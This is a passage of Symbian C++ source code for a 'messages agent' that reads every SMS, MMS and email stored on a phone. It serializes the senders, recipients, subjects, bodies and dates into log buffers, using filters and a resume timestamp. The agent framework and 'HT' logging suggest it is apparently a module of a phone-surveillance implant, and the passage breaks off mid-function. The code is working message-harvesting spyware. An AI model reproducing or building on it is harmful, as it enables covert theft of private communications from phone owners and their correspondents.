/*
 ============================================================================
 Name		: AgentMessages.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentMessages implementation
 ============================================================================
 */

#include "AgentMessages.h"
#include <mmsconst.h>
#include <POPCMTM.H> 
#include <smut.h>
#include <msvapi.h>                     // CMsvSession
#include <mtclreg.h>                    // CClientMtmRegistry
#include <S32MEM.H>
#include <smuthdr.h>
#include <MMsvAttachmentManager.h>		// MMS attachments
#include <smsclnt.h>
#include <UTF.H>						// utf-unicode conversion
#include <CMsvMimeHeaders.h>
#include <f32file.h>					// RFs
#include <charconv.h>

#include <HT\TimeUtils.h>

//#define AGENTCONF_CLASSNAMELEN  32

_LIT(KClassSms,"IPM.SMSText*");
_LIT(KClassMail,"IPM.Note*");
_LIT(KClassMms,"IPM.MMS*");
_LIT(KUs, "Local");

enum TObjectType {
		EStringFolder           = 0x01000000,
		EStringClass            = 0x02000000,
		EStringFrom             = 0x03000000,
		EStringTo               = 0x04000000,
		EStringCc				= 0x05000000,
		EStringBcc              = 0x06000000,
		EStringSubject          = 0x07000000,

		EHeaderMapiV1           = 0x20000000,

		EObjectMIMEBody         = 0x80000000,
		EObjectTextBody			= 0x84000000,
		EObjectAttach           = 0x81000000,
		EObjectDeliveryTime     = 0x82000000,

		EExtended               = 0xFF000000, 		
	};


enum TMessageType
	{
	EUnknown = 0, ESMS, EMMS, ESMTP, EPOP3, EIMAP4
	};



CAgentMessages::CAgentMessages() :
	CAbstractAgent(EAgent_Messages)
	{
	// No implementation required
	}

CAgentMessages::~CAgentMessages()
	{
	__FLOG(_L("Destructor"));
	delete iLongTask;
	delete iFilter;
	delete iSelection;
	delete iSmsMtm;
	delete iMmsMtm;
	delete iMtmReg;   //jo
	delete iMsvSession;
	iMsvArray.Close();

	delete iSmsCollectFilter; 
    delete iSmsRuntimeFilter;
    delete iMmsCollectFilter;
	delete iMmsRuntimeFilter;
    delete iMailCollectFilter;
    delete iMailRuntimeFilter;
    
    delete iMarkupFile;
		
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentMessages* CAgentMessages::NewLC(const TDesC8& params)
	{
	CAgentMessages* self = new (ELeave) CAgentMessages();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentMessages* CAgentMessages::NewL(const TDesC8& params)
	{
	CAgentMessages* self = CAgentMessages::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}


void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilterHeader aFilterHeader)
	{
	aFilter->iLog = aFilterHeader.bEnabled;
	aFilter->iSinceFilter = aFilterHeader.bDoFilterFromDate;
	aFilter->iUntilFilter = aFilterHeader.bDoFilterToDate;
	aFilter->iMaxMessageSize = aFilterHeader.maxMessageSize;
	aFilter->iMaxMessageBytesToLog = aFilterHeader.maxMessageSize;
	if (aFilter->iSinceFilter){
		TUint64 since = aFilterHeader.fromHigh;
		since = aFilterHeader.fromHigh;
		since <<= 32;
		since += aFilterHeader.fromLow;
		//TTime sinceTTime = SetSymbianTime(since);
		TTime sinceTTime = TimeUtils::GetSymbianTime(since);
		aFilter->SetStartDate(sinceTTime);
	}
	else {
		_LIT(KInitialTime,"16010000:000000");

		TTime initialFiletime;
		initialFiletime.Set(KInitialTime);
	}
	if (aFilter->iUntilFilter) {
		TUint64 until = aFilterHeader.toHigh;
		until = aFilterHeader.toHigh;
		until <<= 32;
		until += aFilterHeader.toLow;
		//TTime untilTTime = SetSymbianTime(until);
		TTime untilTTime = TimeUtils::GetSymbianTime(until);
		aFilter->SetEndDate(untilTTime);
	}
	}

void CAgentMessages::ParseParameters(void){
	
	// TODO: remember to update this code when starting to use keywords!!
	
	TUint8* ptr = (TUint8 *)iParams.Ptr(); 		// start of messages agent configuration
	ptr += sizeof(TUint32);						// start of identification tag
	ptr += 32;									// start of first prefix filter
	
	TInt left = iParams.Size() - 36;   
	while (left>0)
	{
		TUint32 outerLen = 0;   				// length of (second prefix)+header
		Mem::Copy(&outerLen, ptr, 3);
		ptr += sizeof(TUint32); 				//start of second prefix filter
		/*
		TUint32 innerLen = 0;   
		Mem::Copy(&innerLen, ptr, 3);
		*/
		ptr += sizeof(TUint32); 				// start header
		TAgentClassFilterHeader filterHeader;
		Mem::Copy(&filterHeader, ptr, sizeof(filterHeader));
	
		TBuf<32> messageClass;
		messageClass.Copy(filterHeader.MessageClass);
		
		if(messageClass.Compare(KClassSms) == 0)
		{
			if(filterHeader.uType == 0)
			{
				FillFilter(iSmsRuntimeFilter,filterHeader);
			}
			else
			{
				FillFilter(iSmsCollectFilter,filterHeader);
			}
		}
		else if (messageClass.Compare(KClassMms) == 0)
		{
			if(filterHeader.uType == 0)
			{
				FillFilter(iMmsRuntimeFilter,filterHeader);
			}
			else
			{
				FillFilter(iMmsCollectFilter,filterHeader);
			}
		} else if (messageClass.Compare(KClassMail) == 0)
		{
			if(filterHeader.uType == 0)
			{
				FillFilter(iMailRuntimeFilter,filterHeader);
			}
			else 
			{
				FillFilter(iMailCollectFilter,filterHeader);
			}
		}
		ptr += sizeof(filterHeader);
		left -= (outerLen+4);   			// +4 because we add the first prefix
	}
	
}

void CAgentMessages::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Messages.txt");
	__FLOG(_L("-------------"));
	
	iMmsCollectFilter = CMessageFilter::NewL(); 
	iMmsRuntimeFilter = CMessageFilter::NewL();
	iSmsCollectFilter = CMessageFilter::NewL(); 
	iSmsRuntimeFilter = CMessageFilter::NewL();
	iMailCollectFilter = CMessageFilter::NewL(); 
	iMailRuntimeFilter = CMessageFilter::NewL();
		
	ParseParameters();
	
	iLongTask = CLongTaskAO::NewL(*this);
	iMsvSession = CMsvSession::OpenSyncL(*this); // open the session with the synchronous primitive
	iFilter = CMsvEntryFilter::NewL();
	iSelection = new (ELeave) CMsvEntrySelection();
	
	iMtmReg = CClientMtmRegistry::NewL(*iMsvSession);  
	iMmsMtm = static_cast<CMmsClientMtm*>(iMtmReg->NewMtmL(KUidMsgTypeMultimedia));
	iSmsMtm = static_cast<CSmsClientMtm*>(iMtmReg->NewMtmL(KUidMsgTypeSMS));
		
	iMarkupFile = CLogFile::NewL(iFs);
	}

void CAgentMessages::PopulateArrayWithChildsTMsvIdEntriesL(TMsvId parentId)
	{
	iSelection->Reset();
	iMsvSession->GetChildIdsL(parentId, *iFilter, *iSelection);
	for (int i = 0; i < iSelection->Count(); i++)
		{
		TMsvId msvId = iSelection->At(i);
		iMsvArray.Append(msvId);
		}
	}

void CAgentMessages::StartAgentCmdL()
	{
	// There is a file log for every message, so we don't open a file log here
	__FLOG(_L("START AGENT CMD"));
	iStopLongTask = EFalse;
	iMsvArray.Reset();
	iArrayIndex = 0;
	iMsvArray.Append(KMsvRootIndexEntryId);  

	// if markup exists, set iMarkup to that value and modify range into filters
	if(iMarkupFile->ExistsMarkupL(Type())){
		// retrieve markup
		// we add just a microsecond to the timestamp so that we are sure not to take 
		// the contact of the timestamp saved into markup
		TTimeIntervalMicroSeconds oneMicrosecond = 1;
		RBuf8 markupBuffer(iMarkupFile->ReadMarkupL(Type()));
		markupBuffer.CleanupClosePushL();
		Mem::Copy(&iMarkup,markupBuffer.Ptr(),sizeof(iMarkup));
		CleanupStack::PopAndDestroy(&markupBuffer);		
		if (iMailCollectFilter->iLog)
			iMailCollectFilter->ModifyFilterRange(iMarkup.mailMarkup+oneMicrosecond);
		/*
		if (iMailRuntimeFilter->iLog)
			iMailRuntimeFilter->ModifyFilterRange(iMarkup.mailMarkup+oneMicrosecond);
		*/
		if (iMmsCollectFilter->iLog)
			iMmsCollectFilter->ModifyFilterRange(iMarkup.mmsMarkup+oneMicrosecond);
		/*
		if (iMmsRuntimeFilter->iLog)
			iMmsRuntimeFilter->ModifyFilterRange(iMarkup.mmsMarkup+oneMicrosecond);
		*/
		if (iSmsCollectFilter->iLog)
			iSmsCollectFilter->ModifyFilterRange(iMarkup.smsMarkup+oneMicrosecond);
		/*
		if (iSmsRuntimeFilter->iLog)
			iSmsRuntimeFilter->ModifyFilterRange(iMarkup.smsMarkup+oneMicrosecond);
		*/
		
		} else {
		_LIT(KInitTime,"16010000:000000");
		iMarkup.smsMarkup.Set(KInitTime);
		iMarkup.mmsMarkup.Set(KInitTime);
		iMarkup.mailMarkup.Set(KInitTime);
	}
	
	iLogNewMessages = ETrue;
	iLongTask->NextRound();
	}

void CAgentMessages::StopAgentCmdL()
	{
	__FLOG(_L("STOP AGENT CMD"));
	iLogNewMessages = EFalse;
	iStopLongTask = ETrue;
	// We close the file log, just in case....
	//CloseLogL();    // TODO: verify this              
	}

/*
void CAgentMessages::AddStoreToStreamL(RWriteStream& strm, const TMsvId& msvId, TMAPISerializedMessageHeader& aSerializedMsg )
	{
	CMsvEntry* entry = iMsvSession->GetEntryL(msvId);
	CleanupStack::PushL(entry);

	// In order to retrieve the E-Mail body the Entry Store must be close... or it will raise an MSGS 259 Panic
	// So we process first the E-Mail body
	if (entry->Entry().iMtm == KUidMsgTypePOP3 || entry->Entry().iMtm == KUidMsgTypeSMTP || entry->Entry().iMtm
			== KUidMsgTypeIMAP4)
		{
		// Dump eMail Body
		CImEmailMessage* mailMsg = CImEmailMessage::NewLC(*entry);
		mailMsg->GetBodyTextL(msvId, CImEmailMessage::EThisMessageOnly, *iRichText, *iParaFormatLayer, *iCharFormatLayer);
		HBufC16* buf = iRichText->Read(0).AllocLC();
		strm << (*buf);
		CleanupStack::PopAndDestroy(buf);
		CleanupStack::PopAndDestroy(mailMsg);
		}	
	
	if (entry->HasStoreL())
		{
		CMsvStore *store = entry->ReadStoreL();
		CleanupStack::PushL(store);

		// Dumps the "Generic Store" informations
		if (store->HasBodyTextL())
			{
			store->RestoreBodyTextL(*iRichText);

			// Extracts body store as a "Raw" byte array
			HBufC16* buf = iRichText->Read(0).AllocLC();
			strm << (*buf);
			CleanupStack::PopAndDestroy(buf);
			}

		if (entry->Entry().iMtm == KUidMsgTypeSMS)
			{
			// This is a SMS  // jo
			aSerializedMsg.iNumAttachs = 0;
			
			
			// Retrieve the SMS header and saves all the informations to the stream
			CSmsHeader* smsHeader = CSmsHeader::NewL(CSmsPDU::ESmsSubmit, *iRichText);
			CleanupStack::PushL(smsHeader);
			smsHeader->RestoreL(*store);
			strm << (smsHeader->Message());
			CleanupStack::PopAndDestroy(smsHeader);
			}

		if (entry->Entry().iMtm == KUidMsgTypeMultimedia)
			{
			// TODO: this header is not available... 
			// #include <MMSHEADERS.h>
			//   CMmsSettings* mmsSettings = CMmsSettings::NewL();
			//   mmsSettings->LoadSettingsL();
			// 
			//   CMmsHeaders* mmsHeaders = CMmsHeaders::NewL( mmsSettings->MmsVersion() );
			//   mmsHeaders->RestoreL(*store);
			//   strm << (mmsHeaders->Message());
			//
			}

		if (entry->Entry().iMtm == KUidMsgTypePOP3 || entry->Entry().iMtm == KUidMsgTypeSMTP || entry->Entry().iMtm
				== KUidMsgTypeIMAP4)
			{
			// Retrieve the Email header and saves all the informations to the stream
			CImHeader* mailHeader = CImHeader::NewLC();
			mailHeader->RestoreL(*store);
			strm << (mailHeader->From());
			strm << (mailHeader->InReplyTo());
			strm << (mailHeader->Subject());
			strm << (mailHeader->ReplyTo());
			for (TInt i = 0; i < mailHeader->ToRecipients().Count(); i++)
				{
				strm << (mailHeader->ToRecipients()[i]);
				}
			for (TInt i = 0; i < mailHeader->CcRecipients().Count(); i++)
				{
				strm << (mailHeader->CcRecipients()[i]);
				}
			for (TInt i = 0; i < mailHeader->BccRecipients().Count(); i++)
				{
				strm << (mailHeader->BccRecipients()[i]);
				}
			CleanupStack::PopAndDestroy(mailHeader);
			}
		CleanupStack::PopAndDestroy(store);
		}
	CleanupStack::PopAndDestroy(entry);
	}
*/

HBufC8* CAgentMessages::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
{

	TMAPISerializedMessageHeader serializedMsg;
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
		
	// set attachment number
	serializedMsg.iNumAttachs = 0;
			
	// set date in filetime format
	//TInt64 date = GetFiletime(aMsvEntryIdx.iDate);
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
			
	// insert folder name
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
			CleanupStack::PopAndDestroy(buffer);
			return HBufC8::New(0);
		}
	TUint8* ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	TUint32 typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size());
		
	// insert class
	typeAndLen = EStringClass;
	typeAndLen += KClassSms().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassSms().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassSms().Size());
	
	
	iSmsMtm->SwitchCurrentEntryL(aMsvId);
	iSmsMtm->LoadMessageL();
	// insert sender 
	typeAndLen = EStringFrom;
	typeAndLen += iSmsMtm->SmsHeader().FromAddress().Size();
	ptrData = (TUint8 *)iSmsMtm->SmsHeader().FromAddress().Ptr();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, iSmsMtm->SmsHeader().FromAddress().Size());
	// insert recipients:
	const MDesC16Array &array = iSmsMtm->AddresseeList().RecipientList();
	TInt count = array.MdcaCount();
	CBufBase* buf = CBufFlat::NewL(50);
	CleanupStack::PushL(buf);
	_LIT(KVirgola,",");
	for(TInt i = 0; i<count; i++)
		{
		ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
		buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
		if(i < (count-1))
			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
										
		}
	typeAndLen = EStringTo;
	typeAndLen += buf->Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), buf->Ptr(0), buf->Size());
	CleanupStack::PopAndDestroy(buf);																					
	
	// insert body
	// this code retrieves body larger than 256 characters:
	// http://discussion.forum.nokia.com/forum/showthread.php?146721-how-to-get-FULL-message-body-for-SMS/page2&highlight=mime+body
	CMsvEntry* cEntry = iMsvSession->GetEntryL(aMsvId);
	CleanupStack::PushL(cEntry);
	if (cEntry->HasStoreL())
		{
		CMsvStore *store = cEntry->ReadStoreL();
		CleanupStack::PushL(store);
			
		if (store->HasBodyTextL())
			{
			TInt length = iSmsMtm->Body().DocumentLength();
			
			HBufC* bodyBuf = HBufC::NewLC(length);
			
			TPtr ptr(bodyBuf->Des());
			iSmsMtm->Body().Extract(ptr,0,length);	
			typeAndLen = EStringSubject;
			typeAndLen += ptr.Size();
			buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
			ptrData = (TUint8 *)bodyBuf->Des().Ptr();
			buffer->InsertL(buffer->Size(), ptrData, bodyBuf->Des().Size());
			
			CleanupStack::PopAndDestroy(bodyBuf);
			
			}
		CleanupStack::PopAndDestroy(store);
		}
	CleanupStack::PopAndDestroy(cEntry);
	
	serializedMsg.iDwSize += buffer->Size();
	// insert the log structure 
	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
		
	HBufC8* result = buffer->Ptr(0).AllocL();
		
	CleanupStack::PopAndDestroy(buffer);
	
	// we set here the markup, the buffer is not zero and we know everything
	if(iMarkup.smsMarkup < aMsvEntryIdx.iDate){
		iMarkup.smsMarkup = aMsvEntryIdx.iDate;
	}
	return result;
	
}
	

HBufC8* CAgentMessages::GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
	{

	TMAPISerializedMessageHeader serializedMsg;
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	// TODO:remember to set real attachment number, see below in the body retrieval part
	serializedMsg.iNumAttachs = 0;
				
	// set date in filetime format
	//TInt64 date = GetFiletime(aMsvEntryIdx.iDate);
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
					
	// insert folder name
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
		CleanupStack::PopAndDestroy(buffer);
		return HBufC8::New(0);
		}
	TUint8* ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	TUint32 typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size());
			
	// insert class
	typeAndLen = EStringClass;
	typeAndLen += KClassMms().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassMms().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassMms().Size());
		
	// insert body
	CMsvEntry* entry = iMsvSession->GetEntryL(aMsvId); 	
	CleanupStack::PushL(entry);
	CMsvStore* store = entry->ReadStoreL(); 	
	if(store!= NULL) 	
	    { 		
	    CleanupStack::PushL(store); 		
	    MMsvAttachmentManager& attManager = store->AttachmentManagerL(); 		

		// TODO:set attachment number while working with attachment  manager 
		//serializedMsg.iNumAttachs = attManager.AttachmentCount();
	
	    _LIT8(KMimeBuf, "text/plain"); 			         
	    TBuf8<10>mimeBuf(KMimeBuf);
				
	    // Cycle through the attachments
	    for(TInt i=0; i<attManager.AttachmentCount(); i++) 			
	        { 			
	        CMsvAttachment* attachment = attManager.GetAttachmentInfoL(i); 			
	        CleanupStack::PushL(attachment); 			
			
	        // Test to see if we have a text file
	        if(mimeBuf.CompareF(attachment->MimeType())== 0) 				
	            {
				RFile file = attManager.GetAttachmentFileL(i);
	        	            
	        	// The file can then be read using the normal file functionality
	        	// After reading, the file should be closed
	        	TInt fileSize = 0;
	        	User::LeaveIfError(file.Size(fileSize));
	        	            
	        	HBufC8* fileBuf8 = HBufC8::NewLC(fileSize);
	        	TPtr8 bufPtr = fileBuf8->Des();
	        	User::LeaveIfError(file.Read(bufPtr, fileSize));
	        	file.Close();
	        	
				
	        	/*
	        	// correspondances TUint-charset are IANA MIBenum:
	        	// http://www.iana.org/assignments/character-sets
	        	// this code isn't working: 
	        	// - CMsvMimeHeaders::MimeCharset provides you the assigned number from IANA
				// - CCnvCharacterSetConverter::PrepareToConvertToOrFromL expects the UID of a converter implementation - from charconv.h (like KCharacterSetIdentifierUtf8=0x1000582d, for UTF8) 
	        	// but this mechanism could be used to provide specific decoding scheme for specific character sets....
	        	// at this moment i only provide for UTF-8 in the part  of code not commented 
				CMsvMimeHeaders* mimeHeaders = CMsvMimeHeaders::NewLC();
				mimeHeaders->RestoreL(*attachment);
				TUint charset = 0;
				charset	= mimeHeaders->MimeCharset();
				CleanupStack::PopAndDestroy(mimeHeaders);
	        
				// Set up file server session
				RFs fileServerSession;
				fileServerSession.Connect();
				CCnvCharacterSetConverter* CSConverter = CCnvCharacterSetConverter::NewLC();
				if (CSConverter->PrepareToConvertToOrFromL(charset,fileServerSession) != 
				            CCnvCharacterSetConverter::EAvailable)
				{
					//CSConverter->PrepareToConvertToOrFromL(charset,fileServerSession);
					User::Leave(KErrNotSupported);
				}
				// Create a buffer for the unconverted text - initialised with the input descriptor
				TPtrC8 remainderOfForeignText(fileBuf8->Des());
				// Create a "state" variable and initialise it with CCnvCharacterSetConverter::KStateDefault
				// After initialisation the state variable must not be tampered with.
				// Simply pass into each subsequent call of ConvertToUnicode()
				TInt state=CCnvCharacterSetConverter::KStateDefault;
				
				HBufC* unicodeText = HBufC::NewLC(fileSize*2);
				TPtr unicodeTextPtr = unicodeText->Des();
				for(;;)  // conversion loop
				{
					const TInt returnValue = CSConverter->ConvertToUnicode(unicodeTextPtr,remainderOfForeignText,state);
				    if (returnValue <= 0) // < error
				    {
				       break;
				    }
				    remainderOfForeignText.Set(remainderOfForeignText.Right(returnValue));
				}
				
				typeAndLen = EStringSubject;
				typeAndLen += unicodeText->Size();
				buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
				ptrData = (TUint8 *)unicodeText->Ptr();
				buffer->InsertL(buffer->Size(), ptrData, unicodeText->Size());
					            
				
				CleanupStack::PopAndDestroy(unicodeText);

				CleanupStack::PopAndDestroy(CSConverter);
				fileServerSession.Close();

				*/
	        	
	        	CMsvMimeHeaders* mimeHeaders = CMsvMimeHeaders::NewLC();
	        	mimeHeaders->RestoreL(*attachment);
	        	TUint charset = mimeHeaders->MimeCharset();
	        	CleanupStack::PopAndDestroy(mimeHeaders);  
	        		        	
	        	if(charset == 0x6a)   // 0x6a = UTF-8  // other charsets can be added below with if statements
	        	{	
					
					RBuf unicodeBuf(CnvUtfConverter::ConvertToUnicodeFromUtf8L(bufPtr));
					unicodeBuf.CleanupClosePushL();
					typeAndLen = EObjectTextBody;   
					typeAndLen += unicodeBuf.Size();
					buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
					ptrData = (TUint8 *)unicodeBuf.Ptr();
					buffer->InsertL(buffer->Size(), ptrData, unicodeBuf.Size());
					CleanupStack::PopAndDestroy(&unicodeBuf);
					            	
	        	}
	        	CleanupStack::PopAndDestroy(fileBuf8);
	        		        	
	            }
	        CleanupStack::PopAndDestroy(attachment);
	        }
	    CleanupStack::PopAndDestroy(store);
	    }  
	CleanupStack::PopAndDestroy(entry);
	
	iMmsMtm->SwitchCurrentEntryL(aMsvId);
	iMmsMtm->LoadMessageL();
	
	// insert subject	
	typeAndLen = EStringSubject;
	typeAndLen += iMmsMtm->SubjectL().Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	ptrData = (TUint8 *)iMmsMtm->SubjectL().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->SubjectL().Size());
	
	// insert sender 
	typeAndLen = EStringFrom;
	typeAndLen += iMmsMtm->Sender().Size();
	ptrData = (TUint8 *)iMmsMtm->Sender().Ptr();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->Sender().Size());
	// insert recipients:
	const MDesC16Array &array = iMmsMtm->AddresseeList().RecipientList();
	TInt count = array.MdcaCount();
	CBufBase* buf = CBufFlat::NewL(50);
	CleanupStack::PushL(buf);
	_LIT(KVirgola,",");
	for(TInt i = 0; i<count; i++)
		{
		ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
		buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
		if(i < (count-1))
			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
									
		}
	typeAndLen = EStringTo;
	typeAndLen += buf->Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), buf->Ptr(0), buf->Size());
	CleanupStack::PopAndDestroy(buf);																					
	
	serializedMsg.iDwSize += buffer->Size();
	
	// insert the log structure 
	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
	HBufC8* result = buffer->Ptr(0).AllocL();
		
	CleanupStack::PopAndDestroy(buffer);
	
	// we set here the markup, the buffer is not zero and we know everything
	if(iMarkup.mmsMarkup < aMsvEntryIdx.iDate){
		iMarkup.mmsMarkup = aMsvEntryIdx.iDate;
	}

	return result;
	}


HBufC8* CAgentMessages::GetMailBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId, CMessageFilter* aFilter)
	{

	//TMAPISerializedMessageHeader serializedMsg;
	//CBufBase* buffer = CBufFlat::NewL(50);
	//CleanupStack::PushL(buffer);
	
	CBufBase* mailBuffer = CBufFlat::NewL(50);
	CleanupStack::PushL(mailBuffer);
		
	// TODO:set real attachment number when server ready
	//serializedMsg.iNumAttachs = 0;
				
	// set date in filetime format
	//TInt64 date = GetFiletime(aMsvEntryIdx.iDate);
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	//serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	//serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
	iMailRawAdditionalData.highDateTime = (date >> 32);
	iMailRawAdditionalData.lowDateTime = (date & 0xFFFFFFFF);
	
	TUint8* ptrData;
	//TUint32 typeAndLen;
	
	// insert folder name
	/*
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
		CleanupStack::PopAndDestroy(mailBuffer);
		CleanupStack::PopAndDestroy(buffer);
		return HBufC8::New(0);
		}
	ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size()); */
	// insert class
	/*
	typeAndLen = EStringClass;
	typeAndLen += KClassMail().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassMail().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassMail().Size());
	*/
	CMsvEntry* entry = iMsvSession->GetEntryL(aMsvId); 	
	CleanupStack::PushL(entry);
	if(!(entry->HasStoreL()))
	{
		CleanupStack::PopAndDestroy(entry);
		CleanupStack::PopAndDestroy(mailBuffer);
		//CleanupStack::PopAndDestroy(buffer);
		return HBufC8::New(0);
	}
	else
	{	
		// insert everything else
		CImHeader* header = CImHeader::NewLC();
		CMsvStore* store = entry->ReadStoreL();
		CleanupStack::PushL(store);
		header->RestoreL(*store);
		CleanupStack::PopAndDestroy(store);
		
		// insert MessageId:
		_LIT8(KMsgId,"Message-ID: ");
		ptrData = (TUint8 *)KMsgId().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KMsgId().Size());
		ptrData = (TUint8 *)header->ImMsgId().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, header->ImMsgId().Size());
		// insert sender
		/*
		typeAndLen = EStringFrom;
		typeAndLen += header->From().Size();
		ptrData = (TUint8 *)header->From().Ptr();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, header->From().Size());
		*/
		// insert From: into mail buffer
		_LIT8(KFrom,"\r\nFrom: ");
		ptrData = (TUint8 *)KFrom().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KFrom().Size());
		//ptrData = (TUint8 *)header->From().Ptr();
		RBuf8 from8;
		from8.CreateL(header->From().Size());
		from8.CleanupClosePushL();
		from8.Copy(header->From());
		ptrData = (TUint8 *)from8.Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, from8.Size());
		CleanupStack::PopAndDestroy(&from8);
		// insert Date:
		_LIT8(KDate,"\r\nDate: ");
		ptrData = (TUint8 *)KDate().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KDate().Size());
		TTime date = aMsvEntryIdx.iDate;
		TBuf<50> dateString;
		_LIT(KDateString,"%F %E, %D %N %Y %H:%T:%S");
		date.FormatL(dateString,KDateString);
		TBuf8<100> dateString8;
		dateString8.Copy(dateString);
		// Thu, 13 May 2010 04:11
		ptrData = (TUint8 *)dateString8.Ptr();
		mailBuffer->InsertL(mailBuffer->Size(),ptrData,dateString8.Size());
		// insert subject
		/*
		typeAndLen = EStringSubject;
		typeAndLen += header->Subject().Size();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		ptrData = (TUint8 *)header->Subject().Ptr();
		buffer->InsertL(buffer->Size(), ptrData, header->Subject().Size());
		*/
		// insert Subject:
		_LIT8(KSubject, "\r\nSubject: ");
		ptrData = (TUint8 *)KSubject().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KSubject().Size());
		RBuf8 subject8;
		subject8.CreateL(header->Subject().Size());
		subject8.CleanupClosePushL();
		//ptrData = (TUint8 *)header->Subject().Ptr();
		subject8.Copy(header->Subject());
		ptrData = (TUint8 *)subject8.Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, subject8.Size());
		CleanupStack::PopAndDestroy(&subject8);
		// insert to
		const MDesC16Array &arrayTo = header->ToRecipients();
		TInt count = arrayTo.MdcaCount();
		CBufBase* bufTo = CBufFlat::NewL(50);
		CleanupStack::PushL(bufTo);
		CBufBase* bufTo8 = CBufFlat::NewL(50);  // this is necessary to re-create the MIME mail...
		CleanupStack::PushL(bufTo8);
		_LIT(KVirgola,", ");
		for(TInt i = 0; i<count; i++)
		{
			TBuf8<100> receiver;
			receiver.Copy(arrayTo.MdcaPoint(i));
			ptrData = (TUint8 *)arrayTo.MdcaPoint(i).Ptr();
			bufTo->InsertL(bufTo->Size(),ptrData,arrayTo.MdcaPoint(i).Size() );
